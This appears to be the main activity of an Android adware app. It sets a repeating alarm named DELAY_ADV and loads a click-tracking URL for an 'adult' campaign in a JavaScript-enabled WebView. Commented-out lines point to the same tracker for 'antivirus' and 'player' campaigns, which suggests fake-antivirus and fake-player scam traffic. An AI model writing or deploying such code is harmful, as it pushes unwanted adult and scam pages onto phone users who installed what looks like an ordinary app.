package com.example.asti.myapplication;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.TextView;

import java.util.Calendar;

public class MainActivity extends AppCompatActivity {

    AlarmStuff as;
    private WebView webView;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.frame_activity);

        as = new AlarmStuff();
        as.setRepeatingAlarm(MainActivity.this, AlarmStuff.DELAY_ADV);

        webView = (WebView) findViewById(R.id.webView1);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());

        // antivirus
//          webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=anund");

        // adult
        webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=adundfr");

        // player
//        webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=plund");



    }
}

